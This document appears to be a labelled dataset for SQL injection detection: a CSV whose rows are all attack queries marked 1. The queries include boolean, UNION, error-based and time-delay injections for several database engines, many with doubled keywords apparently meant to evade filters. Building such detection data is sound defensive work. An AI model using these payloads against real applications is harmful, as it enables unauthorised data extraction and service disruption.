Query,Label
"1' anandd make_ssetet  (  8403  =  8403,8899  )  ",1
"-3492"" wwherehere 4094  =  4094 oorr 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  selecselectt   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1
-6310 oorr 6715  =  3399,1
"1""  )   oorr 8384  =  liklikee  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )    anandd   (  ""vkqt""  =  ""vkqt",1
"1""   )    )    anandd 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  selecselectt   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   anandd    (    (   ""duuw""  =  ""duuw",1
"1%'   )    )     )   oorr extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  seselectlect   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    aandnd    (    (     (  '%'  =  '",1
1'+  (  seselectlect 'kicv' whwhereere 1976  =  1976 aandnd 3754  =    (  seselectlect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   ffromrom dual   )    )   +',1
"1%"" aandnd 6408  =  7959--",1
"call regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nunullll  )  ,0  )  ,500000000  )  ,nunullll  )   anandd ""cuzi"" lilikeke ""cuzi",1
"1%'   )    )    anandd 6414  =    (  seselectlect count  (  *  )   frofromm rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   anandd    (    (   '%'  =  '",1
1' anandd sleep  (  5  ) ,1
"1""  )   wwherehere 6956  =  6956 oorr 8315  =    (  seleselectct count  (  *  )   frofromm sysibm.systatablebles as t1,sysibm.systatablebles as t2,sysibm.systatablebles as t3  )  --",1
"1%""   )    )    aandnd   (  sselectelect 9067 ffromrom  (  sselectelect count  (  *  )  ,concat  (  0x7171706a71,  (  sselectelect   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x ffromrom iinnfoorrmation_schema.character_sesetts group bbyy x  )  a  )   aandnd    (    (   ""%""  =  """,1
"1',  (  seleselectct   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as iinnt  )  /  (  seleselectct 0 frofromm dual  )   end  )   frofromm dual  )  ",1
"1' oorr 2367  =    (  seselectlect count  (  *  )   ffromrom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"selecselectt benchmark  (  5000000,md5  (  0x4c4d6142   )    )    aandnd    (    (   '%'  =  '",1
seselectlect case when 4176  =  6138 then 1 else nunullll end--,1
"1""  )   as hfvz whwhereere 7186  =  7186 uniounionn all selselectect nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll#",1
"-3461""   )    )    uunionnion all selselectect 6342,6342,6342,6342,6342,6342#",1
-5134   )    )     )   oorr 8571  =  8571--,1
"1'  )   aandnd   (  seleselectct 9067 frfromom  (  seleselectct count  (  *  )  ,concat  (  0x7171706a71,  (  seleselectct   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x frfromom iinnfoorrmation_schema.character_ssetets group bbyy x  )  a  )   aandnd   (  'wfws'  =  'wfws",1
"1'  )    (  selecselectt   (  case when   (  4587  =  4587  )   then regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nulnulll  )  ,0  )  ,500000000  )  ,nulnulll  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   ffromrom   (  valvaluesues  (  0   )    )     )   anandd   (  'ylit' liklikee 'ylit",1
"-3856""  )   as iyzl whwhereere 7394  =  7394 oorr 1570  =  convert  (  iinnt,  (  seleselectct char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  seleselectct   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"1  )   as czeu wherwheree 1738  =  1738 oorr exp  (  ~  (  selecselectt * frofromm   (  selecselectt concat  (  0x7171706a71,  (  selecselectt   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
"1""   )    )     )   oorr   (  seleselectct * frfromom   (  seleselectct  (  sleep  (  5   )    )     )  sddo  )  #",1
"-9456%""   )    )    oorr 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  seleselectct   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   aandnd    (    (   ""%""  =  """,1
"-1168   )    )    as vlol whwhereere 3475  =  3475 oorr 1 group bbyy concat  (  0x7171706a71,  (  seselectlect   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )    haviinng miinn  (  0  )  #",1
"selselectect * frofromm generate_series  (  7407,7407,case when   (  7407  =  6562  )   then 1 else 0 end  )   limilimitt 1--",1
selecselectt   (  case when   (  3681  =  5989  )   then 3681 else cast  (  1 as iinnt  )  /  (  selecselectt 0 frofromm dual  )   end  )   frofromm dual--,1
-9143  )   oorr 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  seselectlect   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1
"-8614'  )   oorr 1 group bbyy concat  (  0x7171706a71,  (  selecselectt   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )    haviinng miinn  (  0  )  #",1
"1'   )    )    aandnd 5556  =    (  selecselectt count  (  *  )   ffromrom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   aandnd    (    (   'nvsy' lilikeke 'nvsy",1
1%'   )    )    anandd 6240  =    (  'qqpjq'||  (  sselectelect case 6240 when 6240 then 1 else 0 end frfromom rdb$databasdatabasee  )  ||'qzvzq'  )   anandd    (    (   '%'  =  ',1
"1""  )   whewherere 5814  =  5814 aandnd 6969  =    (  sselectelect 6969 frfromom pg_sleep  (  5   )    )   --",1
1'  )   whwhereere 2763  =  2763,1
1' whwhereere 8770  =  8770 uniounionn all seselectlect nnullull--,1
"1"" wwherehere 8918  =  8918   (  selselectect   (  case when   (  4587  =  4587  )   then regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nulnulll  )  ,0  )  ,500000000  )  ,nulnulll  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   frofromm   (  vavalueslues  (  0   )    )     )  --",1
"1'||  (  seselectlect 'vsfg' whewherere 3547  =  3547 anandd updupdateatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  seselectlect   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",1
"1' aandnd   (  sselectelect 9067 frofromm  (  sselectelect count  (  *  )  ,concat  (  0x7171706a71,  (  sselectelect   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x frofromm iinnfoorrmation_schema.character_sesetts group bbyy x  )  a  )   aandnd 'rxdz'  =  'rxdz",1
1'+  (  selselectect 'vnue' wwherehere 5807  =  5807,1
1'   )    )     )   rllikeike   (  sselectelect   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    aandnd    (    (     (  'gsjp'  =  'gsjp,1
"-3666""   )    )     )   uniunionon all sselectelect 4136,4136,4136--",1
"1%""  )   oorr   (  selecselectt * ffromrom   (  selecselectt  (  sleep  (  5   )    )     )  sddo  )  #",1
"-3037  )   wwherehere 9024  =  9024 uniounionn all selecselectt 9024,9024--",1
"seselectlect * frfromom generate_series  (  9434,9434,case when   (  9434  =  3991  )   then 1 else 0 end  )   llimitimit 1--",1
"1   )    )    uniunionon all selselectect nunullll,nunullll,nunullll,nunullll--",1
-2452'   )    )     )   uniunionon all selselectect 1951--,1
"1'   )    )    oorr extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  seleselectct   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    anandd    (    (   'tblb'  =  'tblb",1
"1'   )    )    aandnd char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nunullll  )  ,0  )  ,500000000  )  ,nunullll  )   aandnd    (    (   'swjk'  =  'swjk",1
"1'  )   as ghks whewherere 5128  =  5128 ununionion all seselectlect nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull#",1
1'+  (  sselectelect 'mquh' wherwheree 3933  =  3933,1
-9556 oorr   (  2049  =  6967  )  *6967# mhbc,1
sselectelect case when 3252  =  9622 then 1 else nunullll end--,1
"1' oorr row  (  1045,7562  )  >  (  sselectelect count  (  *  )  ,concat  (  0x7171706a71,  (  sselectelect   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x frofromm   (  sselectelect 8488 uunionnion sselectelect 5584 uunionnion sselectelect 3051 uunionnion sselectelect 1210  )  a group bbyy x  )   aandnd 'kdxg' lilikeke 'kdxg",1
"1' oorr 5286  =    (  selselectect count  (  *  )   frfromom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   anandd 'yfkk'  =  'yfkk",1
"selecselectt count  (  *  )   ffromrom generate_series  (  1,5000000  )   anandd   (  'cewn'  =  'cewn",1
"1%'   )    )     )   oorr 5286  =    (  selecselectt count  (  *  )   frofromm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   anandd    (    (     (  '%'  =  '",1
"1""   )    )    as maxe whwhereere 5883  =  5883 ununionion all sselectelect nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull#",1
"selecselectt count  (  *  )   frofromm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 anandd    (    (   'xaoi'  =  'xaoi",1
1'  )   uunionnion all seleselectct nnullull--,1
"1%""   )    )    aandnd 4386  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    aandnd    (    (   ""%""  =  """,1
"-3379  )   ununionion all selselectect 4985,4985,4985,4985,4985,4985,4985,4985,4985,4985--",1
"1   )    )    as oqfr whwhereere 6426  =  6426 anandd make_ssetet  (  8403  =  8403,8899  )  --",1
"1"" anandd updaupdatetexml  (  3393,concat  (  0x2e,0x7171706a71,  (  seleselectct   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",1
1'||  (  seleselectct 'aioq' frfromom dual whewherere 8176  =  8176,1
"-7460"" uunionnion all seleselectct 4273,4273,4273,4273,4273,4273,4273,4273#",1
"1""   )    )     )   oorr 6979  =  llikeike  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )   --",1
"-5062""   )    )     )   oorr   (  1069  =  8974  )  *8974 aandnd    (    (     (  ""hsge""  =  ""hsge",1
"seselectlect * ffromrom generate_series  (  3990,3990,case when   (  3990  =  9597  )   then 1 else 0 end  )   limlimitit 1--",1
"1""   )    )    aandnd 3202  =  llikeike  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )    aandnd    (    (   ""yrgy"" llikeike ""yrgy",1
"1'+  (  selecselectt bldn wherwheree 8321  =  8321 aandnd 8635  =    (  selecselectt count  (  *  )   ffromrom generate_series  (  1,5000000   )    )   --",1
1' whwhereere 4388  =  4388,1
"-7469  )   whwhereere 5875  =  5875 oorr make_ssetet  (  9354  =  9354,7185  )  --",1
-6755  )   oorr 9323  =  9323#,1
"1  )   anandd 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selecselectt   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
"1'   )    )    oorr char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,nnullull  )   anandd    (    (   'brlc'  =  'brlc",1
"1'+  (  seselectlect yfuu wherwheree 1717  =  1717 uniunionon all seselectlect nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll--",1
"1'  )   oorr 9643  =    (  seselectlect count  (  *  )   ffromrom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tabtableles as t3  )   anandd   (  'yabn'  =  'yabn",1
"1'  )   anandd exp  (  ~  (  selecselectt * frfromom   (  selecselectt concat  (  0x7171706a71,  (  selecselectt   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    anandd   (  'opll' llikeike 'opll",1
"1""  )   as qjyu wwherehere 2679  =  2679 anandd 6414  =    (  sselectelect count  (  *  )   frfromom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1""  )   whwhereere 2657  =  2657 aandnd 5309  =  7592--",1
"1%'   )    )    oorr upupdatedatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  seleselectct   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   aandnd    (    (   '%'  =  '",1
1  )   aandnd 3659  =  5475 aandnd   (  8949  =  8949,1
"1"" anandd char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nulnulll  )  ,0  )  ,500000000  )  ,nulnulll  )   anandd ""vukd""  =  ""vukd",1
1'+  (  selselectect aqhj whwhereere 4419  =  4419,1
"-1868""  )   whwhereere 9495  =  9495 oorr 1 group bbyy concat  (  0x7171706a71,  (  selselectect   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )    haviinng miinn  (  0  )  #",1
"1   )    )     )   oorr 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"-7806""   )    )    oorr   (  8459  =  8459  )  *4906 aandnd    (    (   ""vlrj"" liklikee ""vlrj",1
"1"" oorr 7552  =    (  sselectelect count  (  *  )   ffromrom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   aandnd ""zcfa""  =  ""zcfa",1
seselectlect sleep  (  5  )  -- waln,1
"-5863"" oorr 4144  =    (  seselectlect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   frofromm dual  )   aandnd ""gkvy""  =  ""gkvy",1
"1%"" aandnd 3202  =  lilikeke  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )    aandnd ""%""  =  """,1
"-2048   )    )    uunionnion all selecselectt 7054,7054,7054,7054,7054,7054,7054,7054,7054--",1
"1' oorr 5286  =    (  seselectlect count  (  *  )   frfromom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   aandnd 'jjmt'  =  'jjmt",1
"1"" whwhereere 6347  =  6347 uniunionon all sselectelect nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull#",1
"-8432  )   ununionion all seselectlect 8169,8169,8169,8169,8169,8169,8169,8169,8169,8169--",1
"-4889""   )    )    as vvuo wherwheree 8060  =  8060 oorr   (  8459  =  8459  )  *4906--",1
"1""  )   whwhereere 3826  =  3826",1
-3211   )    )    as fsej wherwheree 6348  =  6348 oorr 9805  =  3783--,1
"1'  )   anandd 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selselectect   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   anandd   (  'lvck'  =  'lvck",1
"-1048%"" oorr 3038  =  3038",1
"1  )   oorr 8421  =    (  seselectlect count  (  *  )   frfromom generate_series  (  1,5000000   )    )   ",1
"1""   )    )    as qhnb whewherere 8302  =  8302 anandd   (  3020  =  3020  )  *6703--",1
seselectlect   (  case when   (  6839  =  2730  )   then 6839 else 6839*  (  seselectlect 6839 frofromm mysql.db  )   end  )  #,1
"1""  )   whwhereere 9499  =  9499",1
"1%'  )   aandnd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  selecselectt   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    aandnd   (  '%'  =  '",1
"1""   )    )    oorr 8421  =    (  selselectect count  (  *  )   frofromm generate_series  (  1,5000000   )    )    anandd    (    (   ""ubxw"" lilikeke ""ubxw",1
seselectlect   (  case when   (  3344  =  8103  )   then 3344 else 1/  (  seselectlect 0  )   end  )  --,1
"1  )   uniounionn all seselectlect nnullull,nnullull,nnullull,nnullull#",1
-4384'   )    )     )   oorr 6872  =  6872 aandnd    (    (     (  'ukhl'  =  'ukhl,1
"1'+  (  selselectect qmez whewherere 3729  =  3729 anandd 8148  =  liklikee  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )   --",1
"1""   )    )    uniounionn all seselectlect nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll--",1
"1'   )    )    oorr row  (  1045,7562  )  >  (  selselectect count  (  *  )  ,concat  (  0x7171706a71,  (  selselectect   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x frfromom   (  selselectect 8488 uniunionon selselectect 5584 uniunionon selselectect 3051 uniunionon selselectect 1210  )  a group bbyy x  )   aandnd    (    (   'sucj'  =  'sucj",1
"1 uniunionon all selecselectt nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll--",1
"1   )    )    as dhge whwhereere 4816  =  4816 aandnd 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1""  )   anandd 4386  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    anandd   (  ""ynde""  =  ""ynde",1
"selselectect * frfromom generate_series  (  3607,3607,case when   (  3607  =  4242  )   then 1 else 0 end  )   limlimitit 1--",1
1'||  (  seselectlect 'blvu' frofromm dual whwhereere 9813  =  9813,1
"1,  (  sselectelect   (  case when   (  1609  =  1609  )   then waitfoorr delay '0:0:5' else 1609*  (  sselectelect 1609 ffromrom master..sysdatabdatabaseases  )   end   )    )   ",1
"1' aandnd elt  (  4249  =  4249,7259  )   aandnd 'pgvz'  =  'pgvz",1
-1304'  )   ununionion all selselectect 7639#,1
seselectlect   (  case when   (  3681  =  5026  )   then 3681 else 3681*  (  seselectlect 3681 ffromrom iinnfoorrmation_schema.character_sesetts  )   end  )  #,1
"-8612""  )   oorr 4043  =  3083 anandd   (  ""pjzo"" llikeike ""pjzo",1
"-5780 oorr make_sesett  (  3464  =  4518,4518  )  -- icit",1
"seselectlect count  (  *  )   frofromm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 anandd   (  'wweo'  =  'wweo",1
"1' iinn boolean mode  )   oorr elt  (  5873  =  5873,sleep  (  5   )    )   #",1
-9148  )   whwhereere 2027  =  2027 oorr 8571  =  8571--,1
1   )    )    as somz wherwheree 1598  =  1598,1
" end aandnd    (    (     (  ""poee""  =  ""poee",1
-3849  )   oorr 5580  =  3442--,1
"1"" aandnd make_sesett  (  8403  =  8403,8899  )  ",1
"-5225'   )    )    as zats wherwheree 5629  =  5629 ununionion all selselectect 5629,5629,5629,5629,5629--",1
"-8893%'  )   uunionnion all sselectelect 1254,1254--",1
"1%""  )   oorr char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nunullll  )  ,0  )  ,500000000  )  ,nunullll  )  --",1
"-5596'   )    )     )   uunionnion all seselectlect 4877,4877,4877,4877,4877,4877,4877,4877,4877,4877--",1
"-7238%' oorr make_ssetet  (  5375  =  9563,9563  )   anandd '%'  =  '",1
"-6883""  )   as tbai wwherehere 8121  =  8121 uunionnion all selecselectt 8121,8121,8121,8121,8121,8121,8121,8121--",1
"1 wwherehere 6408  =  6408 uniounionn all seleselectct nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull--",1
"call regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nulnulll  )  ,0  )  ,500000000  )  ,nulnulll  )  #",1
"1%'   )    )     )   oorr char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,nunullll  )  --",1
"1""  )   whwhereere 4964  =  4964",1
1 anandd 6969  =    (  sselectelect 6969 ffromrom pg_sleep  (  5   )    )   -- yczq,1
"1%' oorr char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,nnullull  )   aandnd '%'  =  '",1
"1'   )    )    oorr 7552  =    (  selselectect count  (  *  )   ffromrom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   aandnd    (    (   'cdaq' llikeike 'cdaq",1
"1  )   uunionnion all seleselectct nnullull,nnullull,nnullull,nnullull,nnullull#",1
1'   )    )    as jzoh whwhereere 6484  =  6484 aandnd 7364  =  4233--,1
"1  )   wwherehere 2781  =  2781 oorr 5286  =    (  selselectect count  (  *  )   ffromrom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"-9764' whwhereere 1266  =  1266 oorr elt  (  4069  =  6162,6162  )  --",1
1 anandd 3715 iinn    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  seselectlect   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- knpw,1
1%' rliklikee   (  selecselectt * ffromrom   (  selecselectt  (  sleep  (  5   )    )     )  vwyq  )  #,1
1 wwherehere 3802  =  3802 aandnd 2006  =  2006,1
"-4355""   )    )     )   oorr 9323  =  9323#",1
"1""   )    )    as ihfw whewherere 3949  =  3949 aandnd 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
1   )    )    as triinn wwherehere 8843  =  8843,1
1'||  (  sselectelect 'xdzp' frofromm dual whwhereere 5786  =  5786 aandnd   (  3020  =  3020  )  *6703  )  ||',1
-3881   )    )     )   uniunionon all seleselectct 4438--,1
seleselectct sleep  (  5  )   aandnd    (    (     (  '%'  =  ',1
1'+  (  seselectlect 'dkxk' whwhereere 1241  =  1241 waitfoorr delay '0:0:5'--,1
"1""  )   anandd elt  (  6651  =  1172,1172  )   anandd   (  ""zfkb"" lilikeke ""zfkb",1
"1""  )   aandnd 6565  =  2647 aandnd   (  ""mrge"" lilikeke ""mrge",1
"1'+  (  selecselectt dgnt wwherehere 4701  =  4701 oorr 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
-8729'+  (  seleselectct 'nbzl' wherwheree 7160  =  7160 oorrdeoorrderr bbyy 1#,1
"1%'  )   oorr row  (  1045,7562  )  >  (  selecselectt count  (  *  )  ,concat  (  0x7171706a71,  (  selecselectt   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x frfromom   (  selecselectt 8488 ununionion selecselectt 5584 ununionion selecselectt 3051 ununionion selecselectt 1210  )  a group bbyy x  )   aandnd   (  '%'  =  '",1
"1   )    )    as ynzg whewherere 1926  =  1926 oorr   (  seleselectct 9173 frfromom  (  seleselectct count  (  *  )  ,concat  (  0x7171706a71,  (  seleselectct   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )   x frfromom iinnfoorrmation_schema.character_ssetets group bbyy x  )  a  )  --",1
"1   )    )     )   oorr   (  seleselectct 2*  (  if   (    (   seleselectct * frfromom   (  seleselectct concat  (  0x7171706a71,  (  seleselectct   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   aandnd    (    (     (  7589  =  7589",1
1  )   as hhly wwherehere 2906  =  2906,1
"1'   )    )     (  selecselectt   (  case when   (  4587  =  4587  )   then regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nnullull  )  ,0  )  ,500000000  )  ,nnullull  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   frofromm   (  vvaluesalues  (  0   )    )     )   anandd    (    (   'pcim'  =  'pcim",1
1  )   as vqbf wwherehere 4020  =  4020,1
"-8881%' uniunionon all selselectect 8420,8420,8420,8420,8420,8420,8420#",1
